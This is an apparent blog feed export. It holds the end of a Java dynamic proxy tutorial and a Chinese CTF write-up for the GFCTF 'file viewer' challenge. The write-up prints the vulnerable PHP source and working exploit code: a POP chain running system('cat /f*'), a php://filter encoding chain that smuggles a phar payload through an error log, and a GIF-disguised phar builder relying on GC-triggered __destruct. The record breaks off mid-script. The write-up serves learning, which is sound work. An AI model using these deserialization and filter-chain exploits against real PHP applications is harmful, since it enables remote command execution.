class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DynamicProxy</span><span class="params">(Object object)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.object=object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是你的flag&quot;</span>);</span><br><span class="line">        method.invoke(object,args);</span><br><span class="line">        System.out.println(<span class="string">&quot;请拿好&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这逻辑是很简单的，就是用反射去执行一个方法，然后在执行方法的前后我们可以加入一些代码，这个应该不难理解，接下来我们就来看看主类是怎么写的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test11</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        flag flag = <span class="keyword">new</span> getflag();</span><br><span class="line">        flag1 flag1 = <span class="keyword">new</span> getflag1();</span><br><span class="line">        InvocationHandler handler1 = <span class="keyword">new</span> DynamicProxy(flag);</span><br><span class="line">        flag a = (flag) Proxy.newProxyInstance(getflag.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;flag.class&#125;, handler1);</span><br><span class="line">        a.getflag();</span><br><span class="line">        InvocationHandler handler2 = <span class="keyword">new</span> DynamicProxy(flag1);</span><br><span class="line">        flag1 b = (flag1) Proxy.newProxyInstance(getflag1.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;flag1.class&#125;, handler2);</span><br><span class="line">        b.getflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/16/XzPqwIWsmhYp2BU.png" alt="image.png"></p><p>可以看到，成功了，这真的就很神奇，同一个动态代理的类，居然同时为两种不同的接口以及不同的实现类提供了代理，接下来我们就来讲讲它是怎么实现的，慢慢分析主类的代码，我觉得最重要的就是在动态创建代理类的时候会调用<code>invoke</code>方法，从而实现代理</p><p>首先我们需要定义一个<code>InvocationHandler</code>的实例，将我们需要代理的接口放进去</p><p>接下来就是通过<code>Proxy</code>的静态方法<code>newProxyInstance</code>动态创建代理，而这个方法需要三个参数：</p><p>第一个参数就是使用的类加载器<code>ClassLoader</code>，我们用默认的就行，通常就是接口实现类的<code>ClassLoader</code></p><p>第二个参数是我们需要实现的接口数组，一定要写成数组的形式</p><p>第三个参数是一个实现了<code>InvocationHandler</code>接口的对象，里面包含了具体代理的逻辑</p><p>最后再将返回的<code>Object</code>强制转换回接口就好了</p><p>参考文章：</p><p><a href="https://xie.infoq.cn/article/9a9387805a496e1485dc8430f">https://xie.infoq.cn/article/9a9387805a496e1485dc8430f</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Java动态代理&quot;&gt;&lt;a href=&quot;#Java动态代理&quot; class=&quot;headerlink&quot; title=&quot;Java动态代理&quot;&gt;&lt;/a&gt;Java动态代理&lt;/h1&gt;&lt;p&gt;害前段时间应付该死的学校考试，差不多一个多月的时间没咋学技术吧，就很烦，不过好在结果是好的嘛，现在总算是考完了，可以回家放松放松顺便学学技术了；复习考试之前的那段时间一直在学Java安全，差不多把cc1的链子看完了，确实挺难的，有好多好多要讲到的小东西，接下来就先来总结动态代理吧，相信把好多知识点掰细了它也就不难了&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>WP篇之解析GFCTF---文件查看器</title>
    <link href="https://arsenetang.github.io/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/"/>
    <id>https://arsenetang.github.io/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/</id>
    <published>2021-11-28T16:00:00.000Z</published>
    <updated>2021-12-01T11:29:19.799Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解析GFCTF—文件查看器"><a href="#解析GFCTF—文件查看器" class="headerlink" title="解析GFCTF—文件查看器"></a>解析GFCTF—文件查看器</h1><p>之前那篇文章写了<code>GC</code>回收机制与<code>phar</code>反序列化，正好校赛中就有一道这种类型的题，那么我们就来详细聊聊这道题，这道题在比赛的时候是零解，它需要的其它知识点会在文章中慢慢介绍</p><span id="more"></span><p>这道题可以在<code>Xenny</code>师傅的平台上复现：<a href="https://www.ctfer.vip/">https://www.ctfer.vip/</a>，题目进去之后首先是一个登录框。直接<code>admin admin</code>，登陆进去，然后就<code>www.zip</code>下载源码，源码如下，<code>User.class.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;view/login.html&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;username=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;password=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check())&#123;</span><br><span class="line">                    header(<span class="string">&quot;location:./?c=Files&amp;m=read&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;password===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            (@<span class="keyword">$this</span>-&gt;password)();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123; </span><br><span class="line">            (<span class="variable">$name</span>)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>Myerror.class.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Myerror</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$message</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            ini_set(<span class="string">&#x27;error_log&#x27;</span>,<span class="string">&#x27;/var/www/html/log/error.txt&#x27;</span>);</span><br><span class="line">            ini_set(<span class="string">&#x27;log_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$test</span>=<span class="keyword">$this</span>-&gt;message-&gt;&#123;<span class="keyword">$this</span>-&gt;test&#125;;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>Files.class.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Files</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;log();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;view/file.html&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;filename=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;请输入文件名&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$contents</span>=<span class="keyword">$this</span>-&gt;getFile();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;textarea class=&quot;file_content&quot; type=&quot;text&quot; value=&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$contents</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i&#x27;</span>,<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;这不合理&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$contents</span>=file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;write&#x27;</span>]))&#123;</span><br><span class="line">                file_put_contents(<span class="keyword">$this</span>-&gt;filename,<span class="variable">$contents</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$contents</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;该文件不存在或者内容为空&quot;</span>);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$log</span>=<span class="keyword">new</span> Myerror();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">            (<span class="variable">$key</span>)(<span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h2><p>先来简单分析分析这代码吧，毫无疑问这是一条<code>pop</code>的链子，而且这条链子还挺简单的，这里就简单分析下：</p><p>链子肯定还是首先先找头和尾，头部在<code>User</code>类的<code>__desctruct</code>中，然后尾部是在<code>Files</code>类中的<code>__get</code>中，里面可以执行任意命令；头部首先进入了<code>__desctruct()</code>后，可以通过数组的形式访问任意类的任意方法，那我们就让它访问<code>User</code>类的<code>check()</code>方法中，然后这里有<code>echo</code>，以字符串的形式输出对象，然后就会跳到<code>Myerror</code>类中的<code>__tostring()</code>方法中，然后它里面的<code>$this-&gt;test</code>是可控的，我们让它等于一个<code>Files</code>类里面没有的属性就行了，就可以直接调用<code>__get</code>方法了，并且给<code>$key</code>赋值，所以说现在的<code>exp</code>为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Files</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myerror</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$message</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; test = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; message = <span class="keyword">new</span> Files();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//$this -&gt; password = [$this,&quot;check&quot;];</span></span><br><span class="line">        <span class="keyword">$this</span> -&gt; username = <span class="keyword">new</span> Myerror();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span> -&gt; password = [<span class="keyword">new</span> User(),<span class="string">&quot;check&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>这里有个坑点就是给<code>password</code>赋值必须在外面赋，而不能在<code>__construct()</code>里面，如果在里面赋值的话最后就打不通，我试了试链子是能通的，但最后写进文件里面再打就不行，这个问题困扰了我很久，而且也问过出题人，感觉就挺离谱的</p><p>链子有了我们就应该考虑下一个问题，就是怎么触发这个反序列化，没有<code>unserialize</code>肯定是无法直接触发的，这里猜测大概率是<code>phar</code>反序列化，但问题就是怎么把<code>phar</code>文件上传上去，这里没有上传页面，肯定是不能直接传的，但我们可以看到<code>Myerror.class.php</code>中写到将错误日志文件写到了<code>/var/www/html/log/error.txt</code>，这里就给我们很明显的提示了，就是把想要的数据写入到错误日志里面，我们先随便写点数据进去看看它是个什么形式：</p><p><img src="https://i.loli.net/2021/11/28/VPi346fqsSClhnI.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/11/28/a5WEKMOeYP8zcHg.png" alt="image.png"></p><p>可以看到我们想要的数据以及写进去了，但它前前后后全是垃圾数据，我们得想办法把这些垃圾数据清除掉，让它可以被成功解析，这时候我们看到提示里面说的是<code>php://filter</code>中有很多有趣的过滤器，利用这些过滤器编码就可以吃掉这些脏数据，这里就涉及到新知识点了，具体可以参考这篇文章：<a href="https://www.anquanke.com/post/id/240007">https://www.anquanke.com/post/id/240007</a></p><h2 id="php-filter混合使用吃掉脏数据"><a href="#php-filter混合使用吃掉脏数据" class="headerlink" title="php://filter混合使用吃掉脏数据"></a>php://filter混合使用吃掉脏数据</h2><p>首先，日志文件中经常会有一些历史的数据，我们首先得先清空文件内容，用到这个过滤器<code>php://filter/read=consumed/resource</code>，后面加上想要清空的文件名就行了，本题为：<code>php://filter/read=consumed/resource=log/error.txt</code></p><p>提到利用过滤器编码，我们首先想到的肯定是<code>php://filter/read=convert.base64-encode/resource</code>，为了避免特殊字符造成的混乱，我们可以在读文件时先将文件内容<code>base64</code>编码一下，而PHP在进行<code>base64</code>解码的时候，不符合<code>base64</code>标准的字符就会被自动忽略，因为<code>base64</code>编码只有可能由<code>a-zA-Z0-9</code>这些字符以及<code>=</code>填充字符组成，那么就只会将这些合法字符组成密文进行解密</p><p>我们通过上面可以看出，日志文件的格式是<code>[x1]phar文件[x2]</code>，<code>[x1]和[x2]</code>都是我们不想要的的脏数据，我们利用单个的<code>base64</code>编码肯定是吃不到他们的，但我们的思路是把除了<code>phar</code>文件以外的其它内容全变成非<code>base64</code>的合法字符，这样的话最后来一次<code>base64</code>解码就都吃掉了</p><p>这时候我们看到那篇文章中写道，我们可以先将需要的数据转换成<code>utf-16le</code>的格式；当它由<code>utf-8</code>转换为<code>utf-16le</code>时，它的每一位字符后面都会加上一个<code>\0</code>，这个<code>\0</code>是不可见字符，但当我们将<code>utf-16le</code>转换为<code>utf-8</code>的时候，只有后面有<code>\0</code>的才会被正常转换，其它的就会被当成乱码，当成乱码就很好呀，前面我们提到了我们就是想要把不需要的内容变成乱码，接下来看看测试：</p><p><img src="https://i.loli.net/2021/11/29/htBlkJLzurb9Hp6.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/11/29/pAxRiFMUvS6lmLH.png" alt="image.png"></p><p>好耶，成功了，除了我们想要的内容其它内容都变成了乱码，不过在这道题中，由于<code>utf-16le</code>被<code>ban</code>掉了，所以说我们得想个别的来代替，这里可以用<code>ucs-2</code>来代替就行，原理是一样的；这里还有最后一个问题，就是对空字节的处理，它只有一字节，而 <code>file_get_contents()</code> 在加载有空字节的文件时会 <code>warning</code>，所以说我们要对它进行填充编码，这时候我们就能联想到<code>quoted-printable</code>这种编码了，这里面我就直接偷那篇文章里对这种编码的介绍了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">quoted-printable</span><br><span class="line">这种编码方法的要点就是对于所有可打印字符的 ascii 码，除特殊字符等号 = 外，都不改变。</span><br><span class="line">= 和不可打印的 ascii 码以及非 ascii 码的数据的编码方法是：</span><br><span class="line">先将每个字节的二进制代码用两个十六进制数字表示，然后在前面再加上一个等号 = 。</span><br><span class="line">举例如 = ，它的编码便是 =3D ，3D 可对照十六进制 ascii 码表得到。</span><br></pre></td></tr></table></figure><p>它也有对应的过滤器：<code>convert.quoted-printable-decode</code>，所以说经过这三次编码之后，就可以出现纯净的<code>phar</code>文件了，所以它解码的顺序为：<code>convert.quoted-printable-decode --&gt; ucs-2 -&gt; utf-8 --&gt; base64-decode</code></p><p>所以说我们的编码顺序是：<code>base64-encode --&gt; utf-8 -&gt; ucs-2 --&gt; convert.quoted-printable-decode</code>，我们可以写一个编码脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=file_get_contents(<span class="string">&#x27;ars2.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$payload</span>=iconv(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;UCS-2&#x27;</span>,base64_encode(<span class="variable">$b</span>));</span><br><span class="line">file_put_contents(<span class="string">&#x27;payload.txt&#x27;</span>,quoted_printable_encode(<span class="variable">$payload</span>));</span><br><span class="line"><span class="variable">$s</span> = file_get_contents(<span class="string">&#x27;payload.txt&#x27;</span>);</span><br><span class="line"><span class="variable">$s</span> = preg_replace(<span class="string">&#x27;/=\r\n/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="GC回收机制触发-desctruct"><a href="#GC回收机制触发-desctruct" class="headerlink" title="GC回收机制触发__desctruct"></a>GC回收机制触发__desctruct</h2><p>这里就是这道题的最后的考点了，因为这里我们要触发<code>phar</code>反序列化，所以说肯定是绕不过<code>phar://</code>的，但注意这里的顺序，是先经过<code>file_get_contents</code>然后再经过<code>filter()</code>，所以说这就是上篇文章讲的那个知识点了，由于异常退出它不能正常进入<code>__desctruct()</code>，所以说我们得利用数组让这个对象失去引用进而触发GC回收机制进入到<code>__desctruct()</code>，这个具体可以看我上一篇文章，这里就直接构造<code>exp</code>了，在上一个<code>exp</code>的基础上进行修改即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Files</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myerror</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$message</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; test = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; message = <span class="keyword">new</span> Files();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//$this -&gt; password = [$this,&quot;check&quot;];</span></span><br><span class="line">        <span class="keyword">$this</span> -&gt; username = <span class="keyword">new</span> Myerror();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span> -&gt; password = [<span class="keyword">new</span> User(),<span class="string">&quot;check&quot;</span>];</span><br><span class="line"><span class="variable">$b</span>=[<span class="variable">$a</span>,<span class="literal">null</span>];</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;ars.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); 